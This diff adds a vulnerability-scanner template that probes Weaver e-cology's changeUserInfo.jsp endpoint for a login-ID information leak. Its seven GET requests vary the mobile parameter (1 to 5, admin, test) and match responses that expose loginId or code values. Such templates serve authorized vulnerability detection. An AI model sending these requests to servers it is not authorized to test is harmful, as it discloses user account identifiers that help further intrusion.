@@ -1,0 +1,39 @@
+name: weaver-ecology-changeuserinfo-info-leak
+groups:
+  rules1:
+    - method: GET
+      path: "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'"loginId":') && response.body.bcontains(b'"status":"1"') && !response.body.bcontains(b'"code":"-1"')
+  rules2:
+    - method: GET
+      path: "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=2"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'"loginId":') && response.body.bcontains(b'"status":"1"') && !response.body.bcontains(b'"code":"-1"')
+  rules3:
+    - method: GET
+      path: "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=3"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'"loginId":') && response.body.bcontains(b'"status":"1"') && !response.body.bcontains(b'"code":"-1"')
+  rules4:
+    - method: GET
+      path: "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=4"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'"loginId":') && response.body.bcontains(b'"status":"1"') && !response.body.bcontains(b'"code":"-1"')
+  rules5:
+    - method: GET
+      path: "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=5"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'"loginId":') && response.body.bcontains(b'"status":"1"') && !response.body.bcontains(b'"code":"-1"')
+  rules6:
+    - method: GET
+      path: "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=admin"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'"code":') && response.body.bcontains(b'"status":"1"') && !response.body.bcontains(b'"code":"-1"')
+  rules7:
+    - method: GET
+      path: "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=test"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'"code":') && response.body.bcontains(b'"status":"1"') && !response.body.bcontains(b'"code":"-1"')
+detail:
+  author: 666
